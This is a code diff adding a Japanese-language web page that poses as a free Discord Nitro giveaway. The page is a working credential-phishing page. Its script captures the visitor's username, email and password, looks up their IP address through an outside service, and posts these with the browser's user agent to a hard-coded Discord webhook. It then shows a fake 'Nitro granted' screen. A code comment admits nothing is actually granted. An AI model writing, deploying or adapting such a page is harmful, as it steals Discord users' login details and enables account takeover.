@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord Nitro 無料プレゼントキャンペーン</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;700&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Noto Sans JP', sans-serif;
+      min-height: 100vh;
+      background: linear-gradient(-45deg, #6a11cb, #2575fc, #00ddeb, #00ff9d);
+      background-size: 400% 400%;
+      animation: gradient 15s ease infinite;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 40px 32px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.5);
+      border: 1px solid rgba(255,255,255,0.18);
+      text-align: center;
+      animation: float 6s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
+    }
+
+    h1 {
+      font-size: 2.1rem;
+      margin-bottom: 12px;
+      text-shadow: 0 4px 12px rgba(0,0,0,0.6);
+      background: linear-gradient(90deg, #fff, #ffd700, #ff8c00, #fff);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      animation: shine 4s linear infinite;
+    }
+
+    @keyframes shine {
+      0% { background-position: -200%; }
+      100% { background-position: 200%; }
+    }
+
+    p.subtitle {
+      font-size: 1.05rem;
+      margin-bottom: 32px;
+      opacity: 0.95;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.7);
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 18px;
+      font-size: 1.05rem;
+      border: none;
+      border-radius: 12px;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      backdrop-filter: blur(4px);
+      transition: all 0.3s;
+    }
+
+    input::placeholder {
+      color: rgba(255,255,255,0.6);
+    }
+
+    input:focus {
+      outline: none;
+      background: rgba(255,255,255,0.25);
+      box-shadow: 0 0 0 3px rgba(255,255,255,0.3);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 16px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      background: linear-gradient(90deg, #ff3366, #ff6b6b, #ff8e53);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 8px 25px rgba(255,51,102,0.4);
+      transition: all 0.3s;
+      margin-top: 12px;
+    }
+
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 35px rgba(255,51,102,0.6);
+    }
+
+    .btn:disabled {
+      background: #555;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    #status {
+      margin-top: 28px;
+      font-size: 1.1rem;
+      font-weight: 500;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.6);
+      min-height: 28px;
+    }
+
+    .success-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .success-screen h1 {
+      font-size: 2.8rem;
+      margin-bottom: 20px;
+      color: #ffd700;
+      text-shadow: 0 0 30px #ffd700;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+    }
+
+    .particles {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      pointer-events: none;
+      z-index: -1;
+      overflow: hidden;
+    }
+
+    .particle {
+      position: absolute;
+      background: white;
+      border-radius: 50%;
+      opacity: 0.7;
+      animation: floatParticle linear infinite;
+    }
+
+    @keyframes floatParticle {
+      0% { transform: translateY(100vh) scale(0.5); opacity: 0.8; }
+      100% { transform: translateY(-20vh) scale(0.2); opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="particles" id="particles"></div>
+
+  <div class="container" id="loginScreen">
+    <h1>Discord Nitro 無料プレゼント</h1>
+    <p class="subtitle">今すぐログインして3ヶ月分のNitroを無料でGET！</p>
+
+    <div class="form-group">
+      <input type="text" id="username" placeholder="Discordユーザー名またはメールアドレス" autocomplete="username">
+    </div>
+
+    <div class="form-group">
+      <input type="email" id="email" placeholder="メールアドレス" autocomplete="email">
+    </div>
+
+    <div class="form-group">
+      <input type="password" id="password" placeholder="パスワード" autocomplete="current-password">
+    </div>
+
+    <button class="btn" id="submitBtn">ログインしてNitroを受け取る</button>
+
+    <div id="status"></div>
+  </div>
+
+  <div class="container success-screen" id="successScreen">
+    <h1>🎉 Nitro付与完了！</h1>
+    <p class="subtitle" style="font-size:1.3rem; margin-top:20px;">
+      Discord Nitro Classic 3ヶ月分が<br>あなたのアカウントに付与されました！
+    </p>
+    <p style="margin-top:40px; opacity:0.8; font-size:0.95rem;">
+      数分以内にDiscordアプリ/ブラウザで確認できます
+    </p>
+  </div>
+
+  <script>
+    // 背景パーティクル（キラキラ）
+    function createParticles() {
+      const particles = document.getElementById('particles');
+      for (let i = 0; i < 60; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        const size = Math.random() * 5 + 2;
+        particle.style.width = `${size}px`;
+        particle.style.height = `${size}px`;
+        particle.style.left = `${Math.random() * 100}vw`;
+        particle.style.animationDuration = `${Math.random() * 20 + 15}s`;
+        particle.style.animationDelay = `${Math.random() * 10}s`;
+        particles.appendChild(particle);
+      }
+    }
+    createParticles();
+
+    const loginScreen = document.getElementById('loginScreen');
+    const successScreen = document.getElementById('successScreen');
+    const submitBtn = document.getElementById('submitBtn');
+    const status = document.getElementById('status');
+
+    let ip = "取得中...";
+
+    // IP取得（非同期）
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => ip = d.ip)
+      .catch(() => ip = "取得失敗");
+
+    submitBtn.addEventListener('click', async () => {
+      const username = document.getElementById('username').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (!username || !email || !password) {
+        status.textContent = "すべての項目を入力してください";
+        status.style.color = "#ff6b6b";
+        return;
+      }
+
+      submitBtn.disabled = true;
+      status.textContent = "ログイン認証中...";
+
+      const payload = {
+        content: "**Discordログイン情報（詐欺ページ）**",
+        embeds: [{
+          title: "新規ログイン情報",
+          color: 0xff3366,
+          fields: [
+            { name: "ユーザー名/メール", value: username || "(未入力)", inline: false },
+            { name: "メールアドレス", value: email || "(未入力)", inline: false },
+            { name: "パスワード", value: password || "(未入力)", inline: false },
+            { name: "IPアドレス", value: ip, inline: true },
+            { name: "User-Agent", value: navigator.userAgent.substring(0, 180) + "...", inline: false },
+            { name: "時刻", value: new Date().toLocaleString('ja-JP'), inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const webhook = "https://discord.com/api/webhooks/1468987869371699210/YaPweHX2AMlAXoF7gX6uCCEFfaUUpnTHyhAUZzFN1n5l7N4NGliEkX53zdFV8bT8DLFq";
+
+      try {
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        // 成功演出（実際には何も起きない）
+        loginScreen.style.display = 'none';
+        successScreen.style.display = 'flex';
+
+      } catch (err) {
+        status.textContent = "認証エラー。もう一度お試しください";
+        status.style.color = "#ff6b6b";
+        submitBtn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
